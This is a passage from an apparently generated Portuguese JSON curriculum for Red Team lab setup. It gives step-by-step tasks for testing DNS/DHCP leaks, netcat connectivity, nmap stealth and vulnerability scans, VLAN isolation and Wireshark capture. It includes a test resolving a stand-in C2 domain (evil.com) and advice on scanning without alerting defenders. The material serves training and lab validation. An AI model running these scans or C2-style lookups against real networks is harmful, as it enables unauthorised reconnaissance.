                                "Regras iptables/pfSense explicitamente DROP/REJECT tráfego indesejado.",
                                "NAT não expõe serviços internos via port forwarding acidental.",
                                "Logs de firewall confirmam tentativas de conexão bloqueadas.",
                                "Teste de conectividade outbound funciona apenas para destinos permitidos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de regras falhas (100% cobertura de chains/tables).",
                                "Relatórios de nmap/tcpdump interpretados corretamente sem falsos positivos.",
                                "Tempo de execução dentro do estimado com documentação completa.",
                                "Aplicação correta de comandos sem erros de sintaxe ou permissão.",
                                "Recomendações acionáveis baseadas em evidências dos testes.",
                                "Demonstração de isolamento total via múltiplos vetores de teste."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Compreensão de camadas TCP/IP e roteamento.",
                                "Programação em Scripts: Automatização de testes com Bash/Python + nmap.",
                                "Análise Forense Digital: Interpretação de pcaps para incident response.",
                                "Gestão de Infraestrutura: Configuração de appliances como pfSense.",
                                "Ética em Cibersegurança: Princípios de least privilege em labs Red Team."
                              ],
                              "realWorldApplication": "Em operações de Red Team, valida isolamento de labs para prevenir vazamento de dados durante simulações de ataque, similar a preparações para CTF ou pentests corporativos onde ambientes isolados evitam impactos em produção."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.5.1.3",
                            "name": "Simular vazamentos via DNS e DHCP",
                            "description": "Desabilitar e testar serviços DNS/DHCP para prevenir resoluções externas ou atribuições de IP que possam expor o lab, monitorando com Wireshark.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e desabilitar serviços DNS e DHCP",
                                  "subSteps": [
                                    "Identifique todos os hosts no lab (ex: VMs Kali, Windows, roteadores virtuais).",
                                    "No Linux (ex: Ubuntu/Kali), pare o serviço systemd-resolved: sudo systemctl stop systemd-resolved && sudo systemctl disable systemd-resolved.",
                                    "Desabilite dnsmasq ou isc-dhcp-server: sudo systemctl stop dnsmasq && sudo systemctl disable dnsmasq; sudo systemctl stop isc-dhcp-server && sudo systemctl disable isc-dhcp-server.",
                                    "No Windows, desabilite o servidor DHCP via services.msc e configure DNS para 127.0.0.1 ou desabilite.",
                                    "Edite /etc/resolv.conf para apontar apenas para DNS local ou remover entradas externas: nameserver 127.0.0.1."
                                  ],
                                  "verification": "Execute 'systemctl status dnsmasq isc-dhcp-server systemd-resolved' e confirme status 'inactive/dead'; verifique /etc/resolv.conf sem IPs externos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Acesso root/admin aos hosts do lab",
                                    "Editor de texto (nano/vim)",
                                    "Comandos systemctl"
                                  ],
                                  "tips": "Faça backup das configs originais antes de editar (/etc/resolv.conf.backup). Use 'netstat -tuln | grep :53' para checar portas DNS (53) e DHCP (67/68).",
                                  "learningObjective": "Entender como serviços DNS/DHCP expõem labs e aprender a desabilitá-los de forma segura.",
                                  "commonMistakes": [
                                    "Esquecer de desabilitar em todos os hosts",
                                    "Não fazer backup de configs",
                                    "Deixar firewall permitindo tráfego mesmo com serviço parado"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar monitoramento com Wireshark",
                                  "subSteps": [
                                    "Instale Wireshark em um host monitor (ex: Kali Linux: sudo apt update && sudo apt install wireshark).",
                                    "Selecione a interface de rede do lab (ex: eth0 ou bridge0 em ambiente virtualizado como VirtualBox/VMware).",
                                    "Inicie captura em modo promiscuous: wireshark -i <interface> -k -w capture_dns_dhcp.pcap.",
                                    "Configure filtros de display: dns or bootp or dhcp (para capturar tráfego relevante).",
                                    "Teste captura básica enviando ping local para confirmar tráfego sendo capturado."
                                  ],
                                  "verification": "Verifique arquivo .pcap gerado com tamanho >0 e filtre por 'dns' ou 'dhcp' mostrando zero pacotes iniciais.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Wireshark instalado",
                                    "Interface de rede acessível",
                                    "Ambiente virtualizado (VirtualBox/Proxmox)"
                                  ],
                                  "tips": "Use npcap no Windows para melhor performance. Rode Wireshark como root para promiscuous mode.",
                                  "learningObjective": "Dominar configuração de Wireshark para monitoramento de protocolos específicos como DNS e DHCP.",
                                  "commonMistakes": [
                                    "Captura na interface errada (ex: loopback ao invés de bridge)",
                                    "Não ativar promiscuous mode",
                                    "Filtros de captura muito amplos gerando arquivos grandes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Simular tentativas de vazamento via DNS e DHCP",
                                  "subSteps": [
                                    "Em um host cliente, tente resolução DNS externa: nslookup google.com ou dig google.com.",
                                    "Force renovação DHCP: dhclient -r && dhclient <interface> (Linux) ou ipconfig /release && ipconfig /renew (Windows).",
                                    "Execute comandos que triggerem DNS: ping 8.8.8.8, curl ifconfig.me (se DNS falhar, deve timeout).",
                                    "Simule cenários adversos: rode um script que tenta resolver domínios C2 conhecidos (ex: evil.com).",
                                    "Repita em múltiplos hosts e monitore Wireshark em tempo real."
                                  ],
                                  "verification": "No Wireshark, filtre 'dns' e 'bootp': confirme ausência de queries para servidores externos ou requests DHCP broadcast.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Hosts cliente configurados",
                                    "Wireshark rodando",
                                    "Comandos nslookup/dig/dhclient/ipconfig"
                                  ],
                                  "tips": "Use tshark para automação: tshark -i <iface> -f 'port 53 or portrange 67-68' -w sim.pcap. Registre timestamps das simulações.",
                                  "learningObjective": "Simular comportamentos de vazamento realistas e observar falhas de isolamento de rede.",
                                  "commonMistakes": [
                                    "IPs hardcoded em apps ignorando DNS config",
                                    "DHCP relay ainda ativo no roteador",
                                    "Firewall não dropando UDP 53/67/68"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar resultados e reforçar isolamento",
                                  "subSteps": [
                                    "Pare captura Wireshark e abra o .pcap: estatísticas > Conversations > IPv4/UDP para DNS/DHCP.",
                                    "Busque por anomalias: tráfego UDP 53 outbound, DHCP Discover/Request broadcasts saindo da rede lab.",
                                    "Se vazamentos detectados, ajuste firewall: iptables -A OUTPUT -p udp --dport 53 -j DROP; iptables -A OUTPUT -p udp --dport 67:68 -j DROP.",
                                    "Gere relatório: exporte Wireshark summary e anote zero vazamentos.",
                                    "Teste final: reboot de um host e verifique se mantém isolamento."
                                  ],
                                  "verification": "Relatório confirma '0 DNS queries externas' e '0 DHCP requests outbound'; nslookup falha com timeout.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Wireshark .pcap files",
                                    "Ferramentas iptables/ufw (Linux)",
                                    "Editor para regras firewall"
                                  ],
                                  "tips": "Use follow TCP/UDP stream no Wireshark para inspecionar payloads. Salve filtros como 'dns.qry.name contains \"google\"'.",
                                  "learningObjective": "Analisar capturas de rede para validar isolamento e aplicar correções preventivas.",
                                  "commonMistakes": [
                                    "Ignorar tráfego DNS over HTTPS (DoH) em browsers modernos",
                                    "Regras firewall não persistentes após reboot",
                                    "Análise superficial sem filtros precisos"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab VirtualBox com 3 VMs (Kali attacker, Windows victim, Ubuntu router), desabilite dnsmasq no router, configure Wireshark na Kali bridged à rede interna. Tente 'nslookup whoami.akamai.net' na Windows victim: deve falhar sem tráfego outbound no Wireshark. Force 'ipconfig /renew': nenhum DHCP Offer de fora capturado.",
                              "finalVerifications": [
                                "Nenhum pacote DNS (UDP 53) para IPs externos em capturas Wireshark.",
                                "Zero broadcasts DHCP (Discover/Request/Offer) saindo da rede lab.",
                                "Comandos nslookup/dig timeoutam para domínios externos.",
                                "Renovação DHCP falha ou usa apenas config local estática.",
                                "Reboot de hosts mantém isolamento sem vazamentos.",
                                "Firewall logs mostram drops em tentativas outbound DNS/DHCP."
                              ],
                              "assessmentCriteria": [
                                "Capturas Wireshark limpas: 0% tráfego vazamento (nota 100% se zero pacotes).",
                                "Desabilitação completa de serviços: status inactive em todos hosts.",
                                "Simulações cobrem 5+ cenários (DNS resolve, DHCP renew, ping externo).",
                                "Análise inclui screenshots/filtros Wireshark e relatório escrito.",
                                "Regras firewall persistentes e testadas pós-reboot.",
                                "Tempo total dentro de 80-100 min, com precisão >95%."
                              ],
                              "crossCurricularConnections": [
                                "Networking Fundamentals: Entender protocolos UDP, broadcasts e resolução de nomes.",
                                "Digital Forensics: Análise de pacotes com Wireshark para incident response.",
                                "Linux/Windows SysAdmin: Gerenciamento de serviços e firewalls.",
                                "Red Team Tactics: Simulação de beaconing/C2 para ops reais.",
                                "Cloud Security: Analogia com isolamento de VPCs em AWS/Azure."
                              ],
                              "realWorldApplication": "Em operações Red Team ou CTF, previne labs isolados de acidentalmente beaconar para C2 externos ou expor IPs via DHCP/DNS, evitando detecção por Blue Teams ou ISPs; essencial em pentests air-gapped simulados."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.5.2",
                        "name": "Testes de Conectividade Interna",
                        "description": "Avaliação da conectividade entre hosts dentro do ambiente controlado para simular cenários realistas de pivoting e persistência em operações Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.5.2.1",
                            "name": "Executar testes de ping e conectividade básica",
                            "description": "Realizar pings bidirecionais e verificação de conectividade TCP/UDP entre VMs (ex: attacker -> victim) usando ferramentas nativas como ping e nc (netcat).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente de teste",
                                  "subSteps": [
                                    "Inicie as VMs attacker (ex: Kali Linux) e victim (ex: Ubuntu) no hypervisor.",
                                    "Acesse o terminal em ambas as VMs e execute 'ip addr show' ou 'ifconfig' para identificar os endereços IP (ex: attacker 192.168.56.101, victim 192.168.56.102).",
                                    "Verifique se o netcat (nc) está instalado: 'nc --version'; instale se necessário ('sudo apt install netcat' no Debian-based).",
                                    "Desabilite firewalls temporariamente: 'sudo ufw disable' ou 'sudo systemctl stop firewalld'.",
                                    "Anote os IPs em um documento de teste."
                                  ],
                                  "verification": "IPs confirmados, nc disponível e firewalls desabilitados; documentação inicial criada.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "VMs configuradas (Kali e Ubuntu)",
                                    "Acesso terminal/root",
                                    "Hypervisor (VirtualBox/VMware)"
                                  ],
                                  "tips": [
                                    "Use rede bridged ou host-only para conectividade; teste 'ip addr' em vez de ifconfig em distros modernas."
                                  ],
                                  "learningObjective": "Configurar e inspecionar configurações de rede básicas em VMs Linux.",
                                  "commonMistakes": [
                                    "VMs em redes isoladas",
                                    "Firewalls não desabilitados",
                                    "IPs anotados incorretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar testes de ping bidirecionais",
                                  "subSteps": [
                                    "Na VM attacker, execute 'ping -c 4 <IP_victim>' (ex: ping -c 4 192.168.56.102).",
                                    "Analise a saída: verifique 100% de pacotes recebidos e RTT médio < 1s.",
                                    "Na VM victim, execute 'ping -c 4 <IP_attacker>' para teste reverso.",
                                    "Registre saídas em arquivo: 'ping -c 4 <IP> > ping_test.txt'.",
                                    "Repita se houver perda de pacotes >0%."
                                  ],
                                  "verification": "Pings bidirecionais mostram 0% packet loss e RTT baixo; logs salvos.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Comando ping nativo",
                                    "Terminal em ambas VMs"
                                  ],
                                  "tips": [
                                    "Use -c 4 para limitar pacotes; ignore primeira resposta para estabilizar ARP."
                                  ],
                                  "learningObjective": "Diagnosticar conectividade IP básica usando ICMP.",
                                  "commonMistakes": [
                                    "Ping infinito sem -c",
                                    "Ignorar packet loss",
                                    "Não testar bidirecional"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Testar conectividade TCP com netcat",
                                  "subSteps": [
                                    "Na VM victim, inicie listener TCP: 'nc -l -p 8080'.",
                                    "Na VM attacker, conecte: 'nc <IP_victim> 8080' e envie mensagem (ex: 'Teste TCP OK').",
                                    "Verifique recepção da mensagem no victim e responda.",
                                    "Feche conexões com Ctrl+C em ambas; teste múltiplas vezes.",
                                    "Registre sucesso/falha em log."
                                  ],
                                  "verification": "Mensagens trocadas bidirecionalmente sem erros de conexão.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Netcat (nc) instalado",
                                    "Porta 8080 livre"
                                  ],
                                  "tips": [
                                    "Escolha porta não privilegiada (>1024); use -v para verbose output."
                                  ],
                                  "learningObjective": "Validar conectividade TCP de camada de transporte.",
                                  "commonMistakes": [
                                    "Porta em uso",
                                    "Listener não iniciado primeiro",
                                    "Firewall bloqueando porta"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar conectividade UDP com netcat",
                                  "subSteps": [
                                    "Na VM victim, inicie listener UDP: 'nc -u -l -p 8081'.",
                                    "Na VM attacker, envie datagrama: 'echo \"Teste UDP OK\" | nc -u <IP_victim> 8081'.",
                                    "Verifique recepção no victim; teste reverso (victim envia para attacker).",
                                    "Note que UDP é sem conexão: sem handshake.",
                                    "Registre saídas e compare com TCP."
                                  ],
                                  "verification": "Datagramas UDP recebidos corretamente em ambos sentidos.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Netcat com suporte UDP",
                                    "Porta 8081 livre"
                                  ],
                                  "tips": [
                                    "UDP pode perder pacotes; use -v para ver tráfego; teste com múltiplos envios."
                                  ],
                                  "learningObjective": "Diferenciar e testar protocolos TCP vs UDP.",
                                  "commonMistakes": [
                                    "Esquecer flag -u",
                                    "Aguardar ACK inexistente",
                                    "Portas conflitantes"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de Red Team: VM Kali (attacker, 192.168.56.101) e Ubuntu (victim, 192.168.56.102). Ping de Kali: 'ping -c 4 192.168.56.102' (0% loss). TCP: victim 'nc -l -p 8080', attacker 'nc 192.168.56.102 8080' envia 'HELLO'. UDP: victim 'nc -u -l -p 8081', attacker 'echo \"UDP\" | nc -u 192.168.56.102 8081'.",
                              "finalVerifications": [
                                "Pings bidirecionais com 0% packet loss e RTT <1s.",
                                "Conexão TCP estabelecida e mensagens trocadas.",
                                "Datagramas UDP recebidos em ambos sentidos.",
                                "Logs de todos testes salvos e analisados.",
                                "Nenhum erro de rede ou firewall detectado.",
                                "Ambiente pronto para testes avançados."
                              ],
                              "assessmentCriteria": [
                                "Execução correta de comandos ping e nc sem erros sintáticos.",
                                "Interpretação precisa de saídas (packet loss, conexão falhada).",
                                "Testes bidirecionais completos e documentados.",
                                "Resolução autônoma de problemas comuns (ex: firewall).",
                                "Eficiência no tempo estimado e limpeza do ambiente.",
                                "Demonstração de compreensão de ICMP/TCP/UDP."
                              ],
                              "crossCurricularConnections": [
                                "Fundamentos de Redes (modelo OSI/TCP-IP).",
                                "Comandos Linux/Unix essenciais.",
                                "Segurança de Rede (firewalls, portas).",
                                "Troubleshooting e diagnóstico de sistemas.",
                                "Preparação para CTFs e pentesting."
                              ],
                              "realWorldApplication": "Em operações de Red Team ou CTFs, esses testes garantem conectividade antes de exploits como port scanning ou payload delivery, evitando falhas em ataques simulados contra infraestruturas críticas."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.5.2.2",
                            "name": "Mapear rede com nmap",
                            "description": "Utilizar nmap para escanear hosts internos, portas e serviços, confirmando topologia esperada (ex: nmap -sS -O 192.168.1.0/24).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalar e Configurar Nmap no Ambiente Laboratorial",
                                  "subSteps": [
                                    "Verifique se o Nmap está instalado executando 'nmap --version' no terminal.",
                                    "Caso não esteja instalado, use 'sudo apt update && sudo apt install nmap' em distribuições baseadas em Debian como Kali Linux.",
                                    "Configure privilégios root se necessário para scans avançados (ex: sudo nmap).",
                                    "Teste um scan local simples: 'nmap localhost' para validar funcionamento.",
                                    "Revise a documentação básica com 'nmap --help' e familiarize-se com opções comuns."
                                  ],
                                  "verification": "Comando 'nmap --version' retorna versão atual e 'nmap localhost' lista portas abertas localmente sem erros.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Máquina virtual com Kali Linux ou similar",
                                    "Acesso root/sudo",
                                    "Conexão à rede lab interna"
                                  ],
                                  "tips": "Use sempre ambientes isolados para evitar scans acidentais em redes externas.",
                                  "learningObjective": "Configurar Nmap corretamente para uso em scans de rede interna.",
                                  "commonMistakes": [
                                    "Executar sem sudo, causando falhas em scans SYN",
                                    "Instalar em ambiente não isolado",
                                    "Ignorar verificação de versão"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Planejar e Executar Scan Básico de Hosts",
                                  "subSteps": [
                                    "Defina o range de IP da rede lab (ex: 192.168.1.0/24) com base na topologia esperada.",
                                    "Execute ping scan inicial: 'sudo nmap -sn 192.168.1.0/24' para descobrir hosts ativos.",
                                    "Registre hosts respondendo e compare com diagrama de topologia.",
                                    "Ajuste timing se necessário com '-T4' para scans mais rápidos.",
                                    "Salve saída em arquivo: 'sudo nmap -sn 192.168.1.0/24 -oN hosts_scan.txt'."
                                  ],
                                  "verification": "Lista de hosts ativos gerada e salva, com pelo menos os hosts esperados da topologia detectados.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Diagrama de topologia da rede lab",
                                    "Terminal com Nmap configurado"
                                  ],
                                  "tips": "Comece com -sn para evitar sobrecarga; foque em hosts esperados para eficiência.",
                                  "learningObjective": "Identificar hosts vivos na rede interna usando scans leves.",
                                  "commonMistakes": [
                                    "Usar range IP incorreto",
                                    "Ignorar firewalls que bloqueiam ping",
                                    "Não salvar resultados"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar Scan Avançado de Portas, Serviços e OS",
                                  "subSteps": [
                                    "Inicie scan SYN stealth: 'sudo nmap -sS -O 192.168.1.0/24' para portas TCP e detecção de OS.",
                                    "Adicione versão de serviços: 'sudo nmap -sS -sV -O 192.168.1.0/24'.",
                                    "Escaneie portas UDP se relevante: 'sudo nmap -sU -sV 192.168.1.X' para hosts específicos.",
                                    "Use scripts NSE para mais detalhes: 'sudo nmap -sS --script vuln 192.168.1.X'.",
                                    "Salve saída detalhada: '-oA full_scan' para múltiplos formatos."
                                  ],
                                  "verification": "Relatório gerado com portas abertas, serviços identificados e OS detectados para todos hosts principais.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Lista de hosts do Step 2",
                                    "Topologia esperada para comparação"
                                  ],
                                  "tips": "Scan SYN (-sS) é stealth e rápido; limite portas com -p- para full scan se tempo permitir.",
                                  "learningObjective": "Realizar scans stealth para mapear portas, serviços e sistemas operacionais.",
                                  "commonMistakes": [
                                    "Scan sem sudo (falha em SYN)",
                                    "Sobrecarregar rede com scans agressivos",
                                    "Não detectar OS por falta de privilégios"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Resultados e Confirmar Topologia",
                                  "subSteps": [
                                    "Compare saída Nmap com diagrama de topologia: hosts, portas, serviços.",
                                    "Visualize com ferramentas como Zenmap (GUI do Nmap) se disponível.",
                                    "Identifique discrepâncias (ex: host extra ou porta inesperada) e investigue.",
                                    "Gere relatório resumido: hosts vivos, top 5 portas abertas, OS principais.",
                                    "Valide conectividade manualmente (ex: telnet ou nc para portas abertas)."
                                  ],
                                  "verification": "Relatório confirma 100% match com topologia esperada ou documenta desvios justificados.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "Arquivos de saída Nmap",
                                    "Diagrama de topologia lab",
                                    "Zenmap opcional"
                                  ],
                                  "tips": "Use 'grep' ou 'awk' para filtrar saídas grandes; documente tudo para auditoria.",
                                  "learningObjective": "Interpretar dados de scan para validar conectividade e topologia de rede.",
                                  "commonMistakes": [
                                    "Ignorar falsos negativos por firewalls",
                                    "Não comparar com topologia esperada",
                                    "Relatório incompleto"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com topologia 192.168.1.0/24 (router 192.168.1.1, servers .10-.20, workstations .50-.100), execute 'sudo nmap -sS -sV -O 192.168.1.0/24 -oA lab_map'. Resultado deve mostrar router com portas 80/443, servers com SSH/ RDP, confirmando conectividade interna sem hosts externos.",
                              "finalVerifications": [
                                "Todos hosts esperados detectados e mapeados corretamente.",
                                "Portas e serviços principais identificados sem discrepâncias.",
                                "OS detection acurado para pelo menos 80% dos hosts.",
                                "Nenhum host ou porta inesperada indicando vazamento de rede.",
                                "Relatório salvo e comparado com topologia diagrama.",
                                "Conectividade manual validada em 3+ hosts chave."
                              ],
                              "assessmentCriteria": [
                                "Execução correta de comandos Nmap sem erros de sintaxe.",
                                "Cobertura completa do range IP com resultados precisos.",
                                "Análise demonstra compreensão de stealth scanning e OS detection.",
                                "Relatório claro e acionável para Red Team.",
                                "Tempo total dentro de 1 hora, sem sobrecarga de rede.",
                                "Identificação e mitigação de pelo menos um erro comum."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entendimento de TCP/IP, subnets e roteamento.",
                                "Sistemas Operacionais: Diferenças em fingerprints de OS para detecção.",
                                "Linux/Command Line: Proficiência em terminal e scripting para automação.",
                                "Segurança de Redes: Conceitos de firewalls, stealth scans e evasão.",
                                "Análise de Dados: Interpretação de logs e visualização de topologias."
                              ],
                              "realWorldApplication": "Durante operações Red Team ou pentests, mapear redes internas com Nmap permite confirmar topologia sem alertar defesas, identificar alvos iniciais (ex: domain controllers via porta 445) e planejar escaladas de privilégios em ambientes corporativos reais."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.5.2.3",
                            "name": "Testar conectividade VLAN e sub-redes",
                            "description": "Verificar segmentação de VLANs ou sub-redes simuladas, garantindo que tráfego flua apenas conforme regras de engajamento usando traceroute e VLAN tagging.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente de teste com VLANs e sub-redes configuradas",
                                  "subSteps": [
                                    "Identifique os switches e hosts no lab que representarão VLANs (ex: VLAN 10 para Red Team, VLAN 20 para Blue Team).",
                                    "Configure sub-redes correspondentes (ex: 192.168.10.0/24 para VLAN 10, 192.168.20.0/24 para VLAN 20).",
                                    "Atribua portas dos switches às VLANs apropriadas e habilite trunk ports com tagging 802.1Q onde necessário.",
                                    "Verifique configurações iniciais com 'show vlan brief' e 'show interfaces trunk' no switch.",
                                    "Teste conectividade básica dentro da mesma VLAN usando ping."
                                  ],
                                  "verification": "Execute 'ping' bem-sucedido intra-VLAN e confirme com 'show vlan' que hosts estão na VLAN correta.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Switches configuráveis (Cisco Packet Tracer ou GNS3)",
                                    "Hosts virtuais (VMs ou simulações)",
                                    "Cabo Ethernet ou conexões virtuais"
                                  ],
                                  "tips": "Use comandos CLI como 'vlan 10' e 'switchport access vlan 10' para configuração rápida; documente IPs atribuídos.",
                                  "learningObjective": "Entender configuração básica de VLANs e sub-redes para segmentação de rede.",
                                  "commonMistakes": [
                                    "Esquecer de salvar configuração com 'wr'",
                                    "Configurar trunk sem allowed VLANs",
                                    "IPs fora da sub-rede"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar testes de conectividade intra-VLAN usando ping e traceroute",
                                  "subSteps": [
                                    "Do host na VLAN 10, pingue outro host na mesma VLAN.",
                                    "Execute traceroute para o host intra-VLAN e observe hops (deve ser direto).",
                                    "Repita do host na VLAN 20 para intra-VLAN.",
                                    "Registre latências e perdas de pacotes.",
                                    "Confirme que tráfego flui sem restrições dentro da VLAN."
                                  ],
                                  "verification": "Ping com 100% sucesso e traceroute mostrando 1 hop ou direto.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Ferramentas: ping, traceroute (Windows: tracert)",
                                    "Acesso SSH/Telnet aos hosts"
                                  ],
                                  "tips": "Use -c 10 no ping para estatísticas; compare com baseline de rede limpa.",
                                  "learningObjective": "Validar conectividade esperada dentro de segmentos isolados.",
                                  "commonMistakes": [
                                    "Firewall bloqueando ICMP",
                                    "MTU mismatch causando fragmentação",
                                    "Ignorar perdas de pacotes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Testar isolamento inter-VLAN/sub-rede com tentativas de conectividade não autorizada",
                                  "subSteps": [
                                    "Do host VLAN 10, tente pingar host VLAN 20 (deve falhar).",
                                    "Execute traceroute inter-VLAN e observe onde o tráfego é dropado.",
                                    "Verifique contadores de pacotes dropados no switch/router com 'show interfaces counters errors'.",
                                    "Teste com diferentes protocolos (UDP via nmap se disponível).",
                                    "Confirme que regras de engajamento (ACLs) estão aplicadas."
                                  ],
                                  "verification": "Ping falha com 'Request timed out' e traceroute para no roteador/switch de borda.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Comandos: ping, traceroute, show access-lists",
                                    "Packet sniffer opcional (Wireshark)"
                                  ],
                                  "tips": "Capture tráfego com Wireshark para visualizar tags VLAN ausentes ou dropadas; teste múltiplas vezes.",
                                  "learningObjective": "Demonstrar segmentação efetiva e detecção de vazamentos de tráfego.",
                                  "commonMistakes": [
                                    "ACLs mal configuradas permitindo tráfego",
                                    "Trunk ports sem restrições de VLAN",
                                    "Ignorar native VLAN"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar VLAN tagging e regras de engajamento com análise avançada",
                                  "subSteps": [
                                    "Configure trunk entre switches e verifique tagging com 'show interfaces trunk'.",
                                    "Envie tráfego tagged e untagged, usando ferramentas como hping3 para pacotes customizados.",
                                    "Analise logs do switch para violações de segurança (ex: CDP/LLDP filtrado).",
                                    "Teste failover ou redundância se aplicável.",
                                    "Documente resultados em relatório com screenshots de traceroute."
                                  ],
                                  "verification": "Tráfego tagged passa apenas em trunks permitidos; untagged dropado conforme regras.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramentas avançadas: hping3 ou scapy para pacotes custom",
                                    "Wireshark para análise de frames 802.1Q"
                                  ],
                                  "tips": "Foquem em tags VLAN no Wireshark (filter: vlan.id == 10); teste cenários de ataque simulados.",
                                  "learningObjective": "Garantir conformidade com regras de engajamento via tagging e isolamento.",
                                  "commonMistakes": [
                                    "Não habilitar spanning-tree causando loops",
                                    "Trunks permitindo todas VLANs (*)",
                                    "Overlooking VLAN hopping attacks"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um cyber range simulando uma empresa, VLAN 10 (atacantes Red Team: 192.168.10.0/24) e VLAN 20 (defensores Blue Team: 192.168.20.0/24). Traceroute de 10.1 para 20.5 falha no roteador L3, confirmando isolamento; ping intra-VLAN 10 succeeds.",
                              "finalVerifications": [
                                "Traceroute intra-VLAN: 1-2 hops, 0% perda.",
                                "Traceroute inter-VLAN: drop na borda, sem rota.",
                                "Wireshark mostra tags VLAN corretas em trunks.",
                                "Nenhum tráfego não autorizado capturado.",
                                "Contadores de switch mostram drops esperados.",
                                "Relatório documenta todos testes com evidências."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de VLANs (100% match com plano).",
                                "Interpretação correta de falhas de conectividade.",
                                "Uso adequado de traceroute para mapear caminhos.",
                                "Identificação de 3+ potenciais vazamentos.",
                                "Relatório completo com verificações e screenshots.",
                                "Tempo dentro do estimado sem erros críticos."
                              ],
                              "crossCurricularConnections": [
                                "Fundamentos de Redes (CCNA: VLANs e trunks).",
                                "Segurança de Rede (ACLs e firewalls).",
                                "Análise de Tráfego (Wireshark e forensics).",
                                "Simulações Cibernéticas (Cyber Ranges)."
                              ],
                              "realWorldApplication": "Durante operações Red Team em jogos de guerra cibernéticos, valida se o ambiente lab simula fielmente segmentações de rede corporativa, prevenindo vazamentos de tráfego que invalidariam testes de penetração."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.5.2.4",
                            "name": "Monitorar tráfego com Wireshark",
                            "description": "Capturar e analisar pacotes em interfaces internas para validar ausência de anomalias na conectividade durante testes iniciais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalar e Configurar Wireshark no Ambiente Laboratorial",
                                  "subSteps": [
                                    "Baixar a versão mais recente do Wireshark do site oficial (wireshark.org).",
                                    "Instalar o Wireshark com suporte a Npcap para captura de pacotes em Windows ou libpcap em Linux.",
                                    "Executar Wireshark como administrador para acessar interfaces de rede.",
                                    "Verificar instalação abrindo o Wireshark e confirmando listagem de interfaces.",
                                    "Configurar preferências iniciais: habilitar captura automática e desabilitar prompts desnecessários."
                                  ],
                                  "verification": "Wireshark abre sem erros e detecta interfaces de rede locais.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Computador com acesso à internet",
                                    "Sistema operacional Windows/Linux",
                                    "Npcap/libpcap instalador"
                                  ],
                                  "tips": "Use a versão portable se possível para labs isolados; sempre rode como root/admin.",
                                  "learningObjective": "Entender a instalação segura e configuração básica do Wireshark em ambientes controlados.",
                                  "commonMistakes": [
                                    "Instalar sem Npcap levando a falhas de captura",
                                    "Não rodar como admin resultando em 'no interfaces found'"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Selecionar Interfaces de Rede Internas",
                                  "subSteps": [
                                    "Abrir Wireshark e navegar para a lista de interfaces disponíveis.",
                                    "Identificar interfaces internas (ex: Ethernet local, não Wi-Fi ou WAN).",
                                    "Duplo-clique na interface alvo para iniciar captura preliminar.",
                                    "Observar tráfego basal para confirmar conectividade interna.",
                                    "Parar captura preliminar e anotar nome/ID da interface."
                                  ],
